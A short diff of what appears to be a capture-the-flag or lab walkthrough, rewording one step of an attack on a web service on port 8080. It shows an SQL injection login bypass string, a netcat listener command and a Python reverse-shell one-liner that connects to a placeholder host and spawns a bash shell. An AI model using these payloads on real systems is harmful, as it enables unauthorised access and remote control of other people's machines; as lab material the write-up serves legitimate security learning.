@@ -14,8 +14,8 @@ The web with port 8080 can be discover via nikto, do an SQL injection to login t
 "or"1"="1
 ```
 This code means (NOTHING) or 1=1.  And since 1 does equal 1, a true statement, we bypass this process. Credit to sevenlayers.com 
-Then open a port on your kali with nc, nc -lvp 6666, and load the python reverse shell payload, (x.x.x.x needs to replace with your kali host ip)
 
+Then open a port with nc, nc -lvp 6666, and load the python reverse shell payload
 ```
 bash|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
